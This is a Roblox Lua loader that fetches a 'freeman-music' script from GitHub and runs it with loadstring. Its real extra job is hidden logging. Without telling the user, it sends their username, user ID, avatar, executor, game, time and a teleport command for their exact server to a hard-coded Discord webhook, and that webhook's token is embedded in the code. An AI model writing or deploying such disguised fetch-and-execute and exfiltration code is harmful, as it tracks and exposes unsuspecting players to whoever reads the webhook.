local HttpService=game:GetService("HttpService")
local Players=game:GetService("Players")
local Marketplace=game:GetService("MarketplaceService")

local ORIGINAL="https://raw.githubusercontent.com/Freeman4i37/freeman-scriptss/main/freeman-music.lua"
local WEBHOOK="https://discord.com/api/webhooks/1428042359228071936/nBrMxWbCuQ9VUatcWhoPDFAn4jSvAMdzFHLJ5z3lDCuUHpea-wlXhFCA-BguJRyUZRyD"

local function runOriginal()
 local ok,res=pcall(function()
  local code=game:HttpGet(ORIGINAL)
  local fn=loadstring(code)
  if fn then fn() end
 end)
 return ok,res
end


local function detectExecutor()
 local ok,res
 if _G.identifyexecutor then ok,res=pcall(function() return _G.identifyexecutor() end) if ok and res then return tostring(res) end end
 if identifyexecutor then ok,res=pcall(function() return identifyexecutor() end) if ok and res then return tostring(res) end end
 if syn and syn.getexecutor then ok,res=pcall(function() return syn.getexecutor() end) if ok and res then return tostring(res) end end
 if getexecutor then ok,res=pcall(function() return getexecutor() end) if ok and res then return tostring(res) end end
 return "Desconhecido"
end

local function serverCode()
 local placeId=game.PlaceId or 0
 local jobId=game.JobId or "Desconhecido"
 return string.format('(game:GetService("TeleportService")):TeleportToPlaceInstance(%d, "%s", game.Players.LocalPlayer)', placeId, jobId)
end

local function sendLog(player)
 local nick=player and player.Name or "Desconhecido"
 local userId=player and tostring(player.UserId) or "0"
 local avatar="https://www.roblox.com/headshot-thumbnail/image?userId="..userId.."&width=420&height=420&format=png"
 local executor=detectExecutor()
 local gameName="Desconhecido"
 pcall(function()
  local info=Marketplace:GetProductInfo(game.PlaceId)
  if info and info.Name then gameName=info.Name end
 end)
 local time=os.date("%d/%m/%Y - %H:%M:%S")
 local code=serverCode()

 local embed={
  title="📡 Novo usuário executou o script",
  color=16711680,
  fields={
   {name="👤 Nick:",value=nick,inline=true},
   {name="🆔 ID:",value=userId,inline=true},
   {name="🧩 Executor:",value=executor,inline=true},
   {name="🎯 Game:",value=gameName,inline=false},
   {name="🕐 Horário:",value=time,inline=false},
   {name="🔑 Código de entrada do servidor:",value="```"..code.."```",inline=false}
  },
  thumbnail={url=avatar},
  footer={text="Freeman Log System"}
 }

 local payload={embeds={embed}}
 local body=HttpService:JSONEncode(payload)

 pcall(function()
  if request then
   request({Url=WEBHOOK,Method="POST",Headers={["Content-Type"]="application/json"},Body=body})
  else
   HttpService:PostAsync(WEBHOOK,body,Enum.HttpContentType.ApplicationJson)
  end
 end)
end

local ok,res=runOriginal()
local player=nil
pcall(function() player=Players.LocalPlayer end)
pcall(function() sendLog(player) end)
return ok,res
